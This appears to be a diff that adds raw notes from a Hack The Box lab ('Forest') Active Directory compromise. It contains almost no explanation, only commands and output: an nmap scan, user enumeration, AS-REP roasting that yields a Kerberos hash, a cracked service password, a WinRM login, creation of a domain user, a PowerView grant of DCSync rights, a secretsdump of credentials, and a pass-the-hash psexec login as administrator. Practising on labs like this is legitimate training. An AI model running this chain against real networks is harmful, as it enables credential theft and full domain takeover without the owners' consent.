@@ -1,0 +1,103 @@
+10.10.10.161
+└─$ nmap -A 10.10.10.161 -p 1-65535 -T5 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-17 22:09 CEST
+Warning: 10.10.10.161 giving up on port because retransmission cap hit (2).
+Nmap scan report for forest.htb (10.10.10.161)
+Host is up (0.050s latency).
+Not shown: 65478 closed tcp ports (conn-refused), 33 filtered tcp ports (no-response)
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-17 20:17:45Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49684/tcp open  msrpc        Microsoft Windows RPC
+49703/tcp open  msrpc        Microsoft Windows RPC
+49962/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h26m48s, deviation: 4h02m29s, median: 6m48s
+| smb2-time: 
+|   date: 2024-08-17T20:18:38
+|_  start_date: 2024-08-17T20:07:54
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2024-08-17T13:18:34-07:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+
+
+
+enum4linux 10.10.10.161
+
+sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi
+
+impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.10.10.161 -request -format john
+
+└─$ impacket-GetNPUsers htb.local/ -usersfile user.txt -dc-ip 10.10.10.161 -request -format john
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$svc-alfresco@HTB.LOCAL:bd6b689921bc3a9c2472f4c50a7ce1c4$9c8169b4935909eddc7a6643c012ba567958b351f5e376876d61a20271b9f2e86e9b7886c872728061cf6b48a1946533642015dfcb3aea848689d89d8291618bb6c9fe1569d7eabf6c1c92e0883bc43790a4400e7b7b12fb83960ddc4cd18cbb602fa3ef197bdcbad934a64657e2c285aa575d27435e31e2a6ddc49136feae229c6f42916704bfb132c30bd41f4b040aea5ded47bb0c5687b9df4700dbee5d074876ba3dead91d21f2e6f6a637406fd9ad4a73b92844af586c32431d482e8468a59d16ecd1152bff30ad1676717e195f9a8c60a8ba76b2c6b016ddda53f4f2e233618e703c56
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+
+s3rvice
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice   
+
+bloodhound
+
+net user milo password123 /add /domain
+net user /domain
+net group "Exchange Windows Permissions" /add milo
+
+
+. ./powerview.ps1
+$SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb\milo', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity milo -Rights DCSync
+
+impacket-secretsdump   htb.local/milo:password123@10.10.10.161
+
+impacket-psexec administrator@10.10.10.161 -hashes "aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6"   
+
